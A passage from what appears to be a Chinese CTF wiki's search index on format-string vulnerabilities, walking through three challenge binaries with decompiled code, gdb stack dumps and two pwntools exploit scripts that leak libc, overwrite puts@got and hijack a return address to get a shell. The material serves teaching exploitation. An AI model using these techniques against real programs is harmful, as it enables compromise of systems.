printf(&dest);//\u8f93\u51fadest\u5185\u5bb9 } } return printf(&dest); }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_11","text":"\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_12","text":"\u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive() exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u6ce8\u89e3 \uff1a\u7ed3\u5408 payload \u6765\u770b\uff1a payload = \"%8$s\" + p32(puts_got) \uff0c %8$S \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 7\uff1b p32(puts_got) \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 8 ; \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#hijack-retaddr","text":"","title":"hijack retaddr"},{"location":"fmtstr/fmtstr_example/#_13","text":"\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_14","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 \u4e09\u4e2a\u767d\u5e3d - pwnme_k0 \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_15","text":"\u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:(master) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4ee5\u53ca Full RELRO \u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684 got \u8868\u4e86\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_16","text":"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4) { write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&formata, \"Welc0me to sangebaimao!\\n\"); return printf(&a4 + 4); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a &a4 + 4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 password \u5185\u5bb9\u4e5f\u662f v6 = read(0, (char *)&a4 + 4, 0x14uLL); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 username \u5728\u8ddd\u79bb\u7684 password 20 \u4e2a\u5b57\u8282\u3002 puts(\"Input your username(max lenth:20): \"); fflush(stdout); v8 = read(0, &bufa, 0x14uLL); if ( v8 && v8 <= 0x14u ) { puts(\"Input your password(max lenth:20): \"); fflush(stdout); v6 = read(0, (char *)&a4 + 4, 0x14uLL); fflush(stdout); *(_QWORD *)buf = bufa; *(_QWORD *)(buf + 8) = a3; *(_QWORD *)(buf + 16) = a4; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_17","text":"\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528 system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002 \u6ce8\u89e3 \uff1a \u4e0a\u9762\u8fd9\u53e5\u8bdd\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u6709\u4e00\u4e2a\u72ec\u7acb\u51fd\u6570 A \u7684\u6808\u5e27\uff0c\u8fd9\u4e2a A \u6808\u5e27\u6574\u4f53\u5b58\u653e\u5730\u5740\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002\u4f46\u662f A \u6808\u5e27\u5185\u90e8\u7684\u7ed3\u6784\u662f\u56fa\u5b9a\u7684\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1arbp \u4e00\u5b9a\u5728 rip \u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u3002\u8fd8\u6709\u6211\u4eec\u77e5\u9053\u7684\u662f rbp \u5b58\u50a8\u7684\u662f\u4e0a\u4e00\u4e2a\u6808\u5e27\u7684 rbp \u5730\u5740\uff0c\u5982\u679c\u8bf4\u6bcf\u6b21\u90fd\u662f\u901a\u8fc7\u51fd\u6570 B \u8c03\u7528\u51fd\u6570 A \uff0c\u56e0\u4e3aAB \u6808\u5e27\u957f\u5ea6&\u7ed3\u6784\u56fa\u5b9a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6cc4\u9732\u51fd\u6570 A rbp \u7684\u503c\u51cf\u53bb\u504f\u79fb\u5f97\u5230\u51fd\u6570 A rip \u5730\u5740\u3002 \u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_18","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [rbp+0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u6ce8\u89e3 \uff1a \u8fd9\u91cc\u6211\u8fd8\u662f\u7528\u6211\u4e60\u60ef\u7684\u65b9\u6cd5\uff0c\u8f93\u51fa\u51e0\u4e2a %p \u76f4\u63a5\u6570\u51fa\u6765\u504f\u79fb\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"fmtstr/fmtstr_example/#_19","text":"\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\uff08b printf\uff09\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f \u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf (\u5982 ubuntu 18.04) \u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash , \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn","title":"\u4fee\u6539\u5730\u5740"},{"location":"fmtstr/fmtstr_example/#_20","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwnme_k0.py from pwn import * context.log_level = 'debug' p = process(\"./pwnme_k0\") elf = ELF(\"./pwnme_k0\") # leak stack addr payload = 'a'*0x8 + \"%6$p\" p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil('>') #gdb.attach(p,'b printf') p.sendline('1') p.recvuntil('a'*0x8) stack_leak = int(p.recv(14),16) - 0x38 log.info(\"stack_leak:\"+hex(stack_leak)) # hijack retaddr payload1 = p64(stack_leak) payload2 = \"%2218d%8$hn\" p.recvuntil('>') p.sendline('2') p.recvuntil(\"20): \\n\") p.sendline(payload1) p.recvuntil(\"20): \\n\") p.sendline(payload2) p.recvuntil('>') p.sendline('1') p.interactive() \u6ce8\u89e3 \uff1a \u6cc4\u9732\u5730\u5740\u7684\u65f6\u5019\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7528\u7684\u662f %p \uff0c\u5982\u679c\u7528 %s \u518d u64 \u6cc4\u9732\u51fa\u6765\u7684\u662f\u51fd\u6570 B \u7684 rbp \u7684\u503c\u3002\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u8981\u6c42\u8f93\u51fa\u7684\u662f\u5b57\u7b26\uff0c\u7cfb\u7edf\u5230\u51fd\u6570 A rbp \u7684\u503c\u6307\u5411\u7684\u5730\u5740\u53d6\u503c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570 B \u7684\u503c\u3002\u5982\u679c\u662f %p \u5c31\u5c06\u51fd\u6570 A rbp \u7684\u503c\u8f93\u51fa\u3002 hijack \u90e8\u5206\u7684 payload \uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5230 name \u8f93\u5165\uff0c\u4e5f\u5c31\u662f\u548c stack_leak \u4e00\u8d77\u8f93\u5165\uff0cpassword \u5c31\u968f\u4fbf\u8f93\u5165\u70b9\u4e1c\u897f\u884c\u4e86\u3002\u8fd9\u91cc\u56e0\u4e3a\u8f93\u5165\u957f\u5ea6\u73b0\u5728\uff0c\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528\u6700\u7a33\u59a5\u7684 \u5355\u5b57\u8282 \u8f93\u5165\uff0c\u800c\u662f\u53cc\u5b57\u8282\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_21","text":"","title":"\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"fmtstr/fmtstr_example/#_22","text":"\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\uff08\u51fa\u73b0\u60c5\u51b5\u5c31\u50cf\u4e0b\u9762\u4f8b\u5b50\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u5b57\u7b26\u6307\u9488\u6307\u5411\u6808\u4e0a\uff0c\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u6211\u4eec\u4e0d\u80fd\u5bb9\u6613\u63a7\u5236\u5199\u5165\u7684\u5730\u5740\uff09","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_23","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 CSAW \u4e2d\u7684 contacts \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_24","text":"\u279c 2015-CSAW-contacts git:(master) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86 Canary\u3002\uff08RELRO \u534a\u4fdd\u62a4\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u80fd hijack got \u8868\u5462\uff1fhijack retaddr \u5462\uff1f\uff09","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_25","text":"\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6253\u5370\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo(int a1, int a2, int a3, char *format) { printf(\"\\tName: %s\\n\", a1); printf(\"\\tLength %u\\n\", a2); printf(\"\\tPhone #: %s\\n\", a3); printf(\"\\tDescription: \"); return printf(format); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a format \u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u6ce8\u89e3 \uff1a\u53ef\u4ee5\u4ece\u8c03\u7528 PrintInfo \u7684\u4e0a\u5c42\u51fd\u6570\u67e5\u770b\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff1a\uff08v2 \u662f\u7ed3\u6784\u4f53\u94fe\u8868\uff09 sub_8048BD1(v2 + 8, *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 4), *(char **)v2);","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_26","text":"\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684 shell\uff0c\u4ece\u800c\u62ff\u5230 flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 got \u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301 got \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709 printf \u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020 /bin/sh \u8ba9\u5b83\u6267\u884c system('/bin/sh')\uff0c\u4f46\u662f printf \u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u6ce8\u89e3 \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u8f93\u5165\u53c2\u6570\u7684\u51fd\u6570\u5c31\u53ea\u6709 printf \uff0c\u8bf8\u5982 puts \u7b49\u7684\u53c2\u6570\u90fd\u662f\u6211\u4eec\u4e0d\u53ef\u63a7\u7684\u3002\u56e0\u4e3a\u4fee\u6539 got \u8868\u4e4b\u540e\u6211\u4eec\u9700\u8981\u4f20\u5165 binsh \u7684\u5730\u5740\uff0c\u6240\u4ee5\u53ea\u80fd\u9009\u62e9 printf \u3002\u4f46\u662f\u9009\u62e9 printf \u53c8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u4fee\u6539\u5b8c\u540e\uff0cprintf \u5404\u4e2a\u5730\u65b9\u90fd\u4f1a\u7528\u5230\uff0c\u8fd8\u6ca1\u8fd0\u884c\u5230\u6211\u4eec\u80fd\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff0c\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u6302\u903c\u4e86\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0 wiki 